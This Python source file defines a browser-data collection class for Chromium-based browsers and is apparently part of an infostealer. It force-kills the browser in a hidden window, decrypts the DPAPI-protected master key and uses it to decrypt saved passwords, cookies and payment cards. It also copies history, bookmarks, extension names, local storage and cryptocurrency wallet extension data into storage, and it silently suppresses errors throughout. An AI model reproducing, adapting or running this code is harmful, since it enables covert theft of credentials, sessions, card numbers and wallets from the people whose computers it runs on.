from re import compile
from base64 import b64decode
from json import load, loads
from os import path, listdir
from typing import Tuple, List
from datetime import datetime, timedelta
from sqlite3 import connect, Connection, Cursor
from ctypes import windll, byref, cdll, c_buffer
from subprocess import run, CREATE_NEW_CONSOLE, SW_HIDE

from helper.helpers.dataclasses import Data
from helper.enums.features import Features
from helper.helpers.config import ChromiumConfig
from helper.helpers import AESModeOfOperationGCM, DataBlob, MemoryStorage


class Chromium:
    """
    Collects data from the browser.
    """
    def __init__(self, browser_name: str, browser_path: str, process_name: str, statuses: List):

        self.__browser_name = browser_name
        self.__state_path = path.join(browser_path, "Local State")
        self.__browser_path = browser_path
        self.__process_name = process_name
        self.__statuses = statuses
        self.__profiles = None

        self.__storage = MemoryStorage()
        self.__config = ChromiumConfig()
        self.__path = path.join("Browsers", self.__browser_name)

    def _kill_process(self):
        """
        Kills browser process.

        Parameters:
        - None.

        Returns:
        - None.
        """
        run(
            f"taskkill /f /im {self.__process_name}",
            shell=True,
            creationflags=CREATE_NEW_CONSOLE | SW_HIDE
        )

    def _get_profiles(self) -> List:
        """
        Collects all browser profiles.

        Parameters:
        - None.

        Returns:
        - list: List of all browser profiles.
        """
        pattern = compile(r"Default|Profile \d+")
        profiles = sum([pattern.findall(dir_path) for dir_path in listdir(self.__browser_path)], [])
        profile_paths = [path.join(self.__browser_path, profile) for profile in profiles]

        if profile_paths:
            return profile_paths

        return [self.__browser_path]

    def _check_paths(self) -> None:
        """
        Checks if a browser is installed and if data collection from it is enabled.

        Parameters:
        - None.

        Returns:
        - None.
        """
        if path.exists(self.__browser_path) and any(self.__statuses):
            self.__profiles = self._get_profiles()

    @staticmethod
    def _crypt_unprotect_data(encrypted_bytes: b64decode, entropy: bytes = b'') -> bytes:
        """
        Decrypts data previously encrypted using Windows CryptProtectData function.

        Parameters:
        - encrypted_bytes [b64decode]: The encrypted data to be decrypted.
        - entropy [bytes]: Optional entropy to provide additional security during decryption.

        Returns:
        - bytes: Decrypted data as bytes.
        """
        blob = DataBlob()

        if windll.crypt32.CryptUnprotectData(byref(DataBlob(len(encrypted_bytes), c_buffer(encrypted_bytes, len(encrypted_bytes)))), None, byref(DataBlob(len(entropy), c_buffer(entropy, len(entropy)))), None, None, 0x01, byref(blob)):

            buffer = c_buffer(int(blob.cbData))
            cdll.msvcrt.memcpy(buffer, blob.pbData, int(blob.cbData))
            windll.kernel32.LocalFree(blob.pbData)

            return buffer.raw

    def _get_key(self) -> bytes:
        """
        Receives the decryption key.

        Parameters:
        - None.

        Returns:
        - bytes: Decryption key.
        """
        with open(self.__state_path, "r", encoding="utf-8") as state:
            file = state.read()

        state.close()

        return self._crypt_unprotect_data(b64decode(loads(file)["os_crypt"]["encrypted_key"])[5:])

    @staticmethod
    def _get_datetime(date: int) -> str:
        """
        Converts timestamp to date.

        Parameters:
        - date [int]: Date to be converted.

        Returns:
        - str: Converted date or error message.
        """
        try:
            return str(datetime(1601, 1, 1) + timedelta(microseconds=date))
        except:
            return "Can't decode"

    @staticmethod
    def _decrypt(value: bytes, master_key: bytes) -> str:
        """
        Decrypts the value with the master key.

        Parameters:
        - value [bytes]: The value to be decrypted.
        - master_key [bytes]: Decryption key.

        Returns:
        - str: Decrypted string.
        """
        try:
            return AESModeOfOperationGCM(master_key, value[3:15]).decrypt(value[15:])[:-16].decode()
        except:
            return "Can't decode"

    @staticmethod
    def _get_db_connection(database: str) -> Tuple[Cursor, Connection]:
        """
        Creates a connection with the database.

        Parameters:
        - database [str]: Path to database.

        Returns:
        - tuple: Cursor and Connection objects.
        """
        connection = connect(
            f"file:{database}?mode=ro&immutable=1",
            uri=True,
            isolation_level=None,
            check_same_thread=False
        )
        cursor = connection.cursor()

        return cursor, connection

    @staticmethod
    def _get_file(file_path: str) -> str:
        """
        Reads the file contents.

        Parameters:
        - file_path [str]: Path to file.

        Returns:
        - str: File content.
        """
        with open(file_path, "r", encoding="utf-8") as file:
            data = file.read()

        return data

    def _grab_passwords(self, profile: str, file_path: str) -> None:
        """
        Collects browser passwords.

        Parameters:
        - profile [str]: Browser profile.
        - main_path [str]: Path of the file to be processed.
        - alt_path [str]: Spare path of the file to be processed.

        Returns:
        - None.
        """
        if not path.exists(file_path):
            pass
            return

        cursor, connection = self._get_db_connection(file_path)
        passwords_list = cursor.execute(self.__config.PasswordsSQL).fetchall()

        cursor.close()
        connection.close()

        if not passwords_list:
            pass
            return

        data = self.__config.PasswordsData
        temp = set([
            data.format(result[0], result[1], self._decrypt(result[2], self.__master_key))
            for result in passwords_list
        ])

        self.__storage.add_from_memory(
            path.join(self.__path, rf"{profile} Passwords.txt"),
            "".join(item for item in temp)
        )

        self.__storage.add_data("Passwords", len(temp))

    def _grab_leveldb(self, profile: str, level_path: str) -> None:
        """
        Collects browser leveldb.

        Parameters:
        - profile [str]: Browser profile.
        - extensions_path [str]: Path to extensions directory.

        Returns:
        - None.
        """
        if not path.exists(level_path):
            pass
            return

        try:

            self.__storage.add_from_disk(
                level_path,
                path.join(self.__path, rf"{profile} Local Storage")
            )

        except Exception as e:
            print(e)
            pass

    

    def _grab_cookies(self, profile: str, file_path: str) -> None:
        """
        Collects browser cookies.

        Parameters:
        - profile [str]: Browser profile.
        - main_path [str]: Path of the file to be processed.
        - alt_path [str]: Spare path of the file to be processed.

        Returns:
        - None.
        """
        if not path.exists(file_path):
            pass
            return

        cursor, connection = self._get_db_connection(file_path)
        cookies_list = cursor.execute(self.__config.CookiesSQL).fetchall()

        cursor.close()
        connection.close()

        if not cookies_list:
            pass
            return

        cookies_list_filtered = [row for row in cookies_list if row[0] != ""]

        data = self.__config.CookiesData
        temp = [
            data.format(row[0], row[1], self._decrypt(row[2], self.__master_key))
            for row in cookies_list_filtered
        ]

        self.__storage.add_from_memory(
            path.join(self.__path, rf"{profile} Cookies.txt"),
            "\n".join(row for row in temp)
        )

        self.__storage.add_data("Cookies", len(temp))

    def _grab_cards(self, profile: str, file_path: str) -> None:
        """
        Collects browser cards.

        Parameters:
        - profile [str]: Browser profile.
        - main_path [str]: Path of the file to be processed.
        - alt_path [str]: Spare path of the file to be processed.

        Returns:
        - None.
        """
        if not path.exists(file_path):
            pass
            return

        cursor, connection = self._get_db_connection(file_path)
        cards_list = cursor.execute(self.__config.CardsSQL).fetchall()

        cursor.close()
        connection.close()

        if not cards_list:
            pass
            return

        data = self.__config.CardsData
        temp = set([
            data.format(result[0], self._decrypt(result[3], self.__master_key), result[1], result[2])
            for result in cards_list
        ])

        self.__storage.add_from_memory(
            path.join(self.__path, rf"{profile} Cards.txt"),
            "".join(item for item in temp)
        )

        self.__storage.add_data("Cards", len(temp))

    def _grab_history(self, profile: str, file_path: str) -> None:
        """
        Collects browser history.

        Parameters:
        - profile [str]: Browser profile.
        - main_path [str]: Path of the file to be processed.
        - alt_path [str]: Spare path of the file to be processed.

        Returns:
        - None.
        """
        if not path.exists(file_path):
            pass
            return

        cursor, connection = self._get_db_connection(file_path)
        results = cursor.execute(self.__config.HistorySQL).fetchall()
        history_list = [cursor.execute(self.__config.HistoryLinksSQL % int(item[0])).fetchone() for item in results]

        cursor.close()
        connection.close()

        if not results:
            pass
            return

        data = self.__config.HistoryData
        temp = set([
            data.format(result[0], result[1], self._get_datetime(result[2]))
            for result in history_list
        ])

        self.__storage.add_from_memory(
            path.join(self.__path, rf"{profile} History.txt"),
            "".join(item for item in temp)
        )

        self.__storage.add_data("History", len(temp))

    def _grab_bookmarks(self, profile: str, file_path: str) -> None:
        """
        Collects browser bookmarks.

        Parameters:
        - profile [str]: Browser profile.
        - main_path [str]: Path of the file to be processed.
        - alt_path [str]: Spare path of the file to be processed.

        Returns:
        - None.
        """
        if not path.exists(file_path):
            pass
            return

        file = self._get_file(file_path)
        bookmarks_list = sum([self.__config.BookmarksRegex.findall(item) for item in file.split("{")], [])

        if not bookmarks_list:
            pass
            return

        data = self.__config.BookmarksData
        temp = set([
            data.format(result[0], result[1])
            for result in bookmarks_list
        ])

        self.__storage.add_from_memory(
            path.join(self.__path, rf"{profile} Bookmarks.txt"),
            "".join(item for item in temp)
        )

        self.__storage.add_data("Bookmarks", len(temp))

    def _grab_extensions(self, profile: str, extensions_path: str) -> None:
        """
        Collects browser extensions.

        Parameters:
        - profile [str]: Browser profile.
        - extensions_path [str]: Path to extensions directory.

        Returns:
        - None.
        """
        if not path.exists(extensions_path):
            pass
            return

        extensions_list = []
        extensions_dirs = listdir(extensions_path)

        if not extensions_dirs:
            pass
            return

        for dirpath in extensions_dirs:

            extension_dir = listdir(path.join(extensions_path, dirpath))

            if len(extension_dir) == 0:
                continue

            extension_dir = extension_dir[-1]
            manifest_path = path.join(extensions_path, dirpath, extension_dir, "manifest.json")

            with open(manifest_path, "r", encoding="utf-8") as file:
                manifest = load(file)
                name = manifest.get("name")

                if name:
                    extensions_list.append(name)

            file.close()

        extensions_set = set(extensions_list)

        self.__storage.add_from_memory(
            path.join(self.__path, rf"{profile} Extensions.txt"),
            "\n".join(item for item in extensions_set)
        )

        self.__storage.add_data("Extensions", len(extensions_set))

    def _grab_wallets(self, profile: str, wallets: str) -> None:
        """
        Collects browser wallets.

        Parameters:
        - profile [str]: Browser profile.
        - wallets [str]: Path to wallets directory.

        Returns:
        - None.
        """
        if not path.exists(wallets):
            pass
            return

        for wallet in self.__config.WalletLogs:
            for extension in wallet["folders"]:

                try:

                    extension_path = path.join(wallets, extension)

                    if not path.exists(extension_path):
                        continue

                    self.__storage.add_from_disk(
                        extension_path,
                        path.join("Wallets", rf'{self.__browser_name} {profile} {wallet["name"]}')
                    )

                    self.__storage.add_data("Wallet", wallet["name"])

                except Exception as e:
                    pass

    def _process_profile(self, profile: str) -> None:
        """
        Collects browser profile data.

        Parameters:
        - profile [str]: Browser profile.

        Returns:
        - None.
        """
        profile_name = profile.replace("\\", "/").split("/")[-1]
        functions = [
            {
                "method": self._grab_passwords,
                "arguments": [profile_name, path.join(profile, "Login Data")],
                "status": True
            },
            {
                "method": self._grab_cookies,
                "arguments": [profile_name, path.join(profile, "Network", "Cookies")],
                "status": True
            },
            {
                "method": self._grab_cards,
                "arguments": [profile_name, path.join(profile, "Web Data")],
                "status": True
            },
            {
                "method": self._grab_history,
                "arguments": [profile_name, path.join(profile, "History")],
                "status": True
            },
            {
                "method": self._grab_bookmarks,
                "arguments": [profile_name, path.join(profile, "Bookmarks")],
                "status": True
            },
            {
                "method": self._grab_extensions,
                "arguments": [profile_name, path.join(profile, "Extensions")],
                "status": True
            },
            {
                "method": self._grab_leveldb,
                "arguments": [profile_name, path.join(profile, "Local Storage")],
                "status": True
            },
            {
                "method": self._grab_wallets,
                "arguments": [profile_name, path.join(profile, "Local Extension Settings")],
                "status": True
            }
        ]

        for function in functions:

            try:

                if function["status"] is False:
                    continue

                function["method"](*function["arguments"])

            except Exception as e:
                pass

    def _check_profiles(self) -> None:
        """
        Collects data for each browser profile.

        Parameters:
        - None.

        Returns:
        - None.
        """
        if not self.__profiles:
            pass
            return

        self.__master_key = self._get_key()

        for profile in self.__profiles:
            self._process_profile(profile)

    def run(self) -> Data:
        """
        Launches the browser data collection module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            self._kill_process()
            self._check_paths()
            self._check_profiles()

            return self.__storage.get_data()

        except Exception as e:
            pass
